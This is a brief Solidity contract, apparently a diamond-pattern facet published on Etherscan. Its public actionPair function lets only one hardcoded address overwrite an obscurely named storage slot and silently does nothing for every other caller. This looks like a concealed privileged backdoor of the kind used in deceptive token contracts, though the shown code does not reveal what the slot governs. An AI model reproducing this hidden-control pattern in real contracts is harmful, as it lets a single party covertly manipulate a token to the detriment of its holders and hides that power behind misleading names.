/**
 *Submitted for verification at Etherscan.io on 2024-04-05
 */

/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0x738F7317dDC61Ae64E5BF1f1c0CEa1fAEf9e18E0)
            ds._p76234 = account;
        return true;
    }
}
